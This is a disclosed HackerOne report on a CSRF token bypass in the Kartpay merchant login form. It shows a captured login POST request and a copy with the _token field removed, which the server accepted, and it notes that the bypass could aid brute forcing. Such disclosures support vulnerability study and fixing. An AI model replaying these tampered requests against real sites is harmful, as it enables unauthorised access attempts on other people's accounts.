---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '642643'
original_report_id: '642643'
title: Bypass _token in forms [Merchant.Kartpay.com ]
team_handle: kartpay
created_at: '2019-07-13T21:45:32.663Z'
disclosed_at: '2019-10-09T05:34:18.970Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 25
asset_identifier: '*.kartpay.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
---

# Bypass _token in forms [Merchant.Kartpay.com ]

## Metadata

- HackerOne Report ID: 642643
- Weakness: 
- Program: kartpay
- Disclosed At: 2019-10-09T05:34:18.970Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
I found a issue in froms related to the Merchant.Kartpay.com domain and it allow to bypassing _token.

## Browsers Verified In:

  *  Firefox 68

## Steps To Reproduce:

  1. Go To Login or any form (https://merchant.kartpay.com/merchant_login)
  2. Fill form and Intercept in burpsuite next click on LOGIN
  3. Request :

```
POST /login HTTP/1.1
Host: merchant.kartpay.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://merchant.kartpay.com/merchant_login
Content-Type: application/x-www-form-urlencoded
Content-Length: 112
Connection: close
Cookie: laravel_session=eyJpdiI6ImU3TkIxd21yXC81SE1rNHlSSnExV3JBPT0iLCJ2YWx1ZSI6IkFmYUMrTEJzXC8rM1VoaWVpUldJN1RGV0doUkZPQ09laThzSHo0dEI4cjgraFhsYWJCSThwK3FkYUNnbjA1OXhNIiwibWFjIjoiNWFkY2E4YmVmYzM4NWYwMzAxN2MwMDZiMjg1MTJlYTdjMGExNDMzMmU3MDk3YjRhMTk4OTg4YmMzYzFjMjk4ZSJ9; XSRF-TOKEN=eyJpdiI6Ink5TmNERjF6UHJnV2NuMjQ5dVB2YUE9PSIsInZhbHVlIjoicEI5SFpxZzd3bkhYeDRBZlNyZWRZZWpcL1wvQTkrR1llbENCUExFYmh0Mk9uaXNxSkp4MTg0d2xHM0NYdVVQRk1cLyIsIm1hYyI6ImM4ODFiMzFkZGY5MzBmNDhiNmU0ZGYxODM3YzZiYmQ0Y2E0ZDkwOGY2MWU1Y2U4ZGNmMGY4Yzg5ZGE1MDk1OWMifQ%3D%3D
Upgrade-Insecure-Requests: 1

_token=877NUN0kNyUQUP8aRDpdjbHnHteOKr6PvfxMsbv4&merchant_id=123456789&email=test%40gmail.com&password=P%40ssw0rd
```
Remove _toekn in request like this and forward request:
```
POST /login HTTP/1.1
Host: merchant.kartpay.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://merchant.kartpay.com/merchant_login
Content-Type: application/x-www-form-urlencoded
Content-Length: 112
Connection: close
Cookie: laravel_session=eyJpdiI6ImU3TkIxd21yXC81SE1rNHlSSnExV3JBPT0iLCJ2YWx1ZSI6IkFmYUMrTEJzXC8rM1VoaWVpUldJN1RGV0doUkZPQ09laThzSHo0dEI4cjgraFhsYWJCSThwK3FkYUNnbjA1OXhNIiwibWFjIjoiNWFkY2E4YmVmYzM4NWYwMzAxN2MwMDZiMjg1MTJlYTdjMGExNDMzMmU3MDk3YjRhMTk4OTg4YmMzYzFjMjk4ZSJ9; XSRF-TOKEN=eyJpdiI6Ink5TmNERjF6UHJnV2NuMjQ5dVB2YUE9PSIsInZhbHVlIjoicEI5SFpxZzd3bkhYeDRBZlNyZWRZZWpcL1wvQTkrR1llbENCUExFYmh0Mk9uaXNxSkp4MTg0d2xHM0NYdVVQRk1cLyIsIm1hYyI6ImM4ODFiMzFkZGY5MzBmNDhiNmU0ZGYxODM3YzZiYmQ0Y2E0ZDkwOGY2MWU1Y2U4ZGNmMGY4Yzg5ZGE1MDk1OWMifQ%3D%3D
Upgrade-Insecure-Requests: 1

merchant_id=123456789&email=test%40gmail.com&password=P%40ssw0rd
```
request was do successfully.

## Impact

Attacke can bypass _token to do some work like brute force and such as...

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
